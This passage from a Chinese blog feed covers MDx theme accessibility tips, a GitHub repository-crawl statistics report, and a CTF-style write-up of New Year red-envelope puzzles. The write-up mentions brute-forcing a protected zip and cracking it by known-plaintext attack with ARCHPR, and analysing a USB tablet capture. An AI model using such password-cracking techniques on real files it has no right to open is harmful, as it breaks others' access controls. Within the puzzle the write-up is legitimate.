中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter 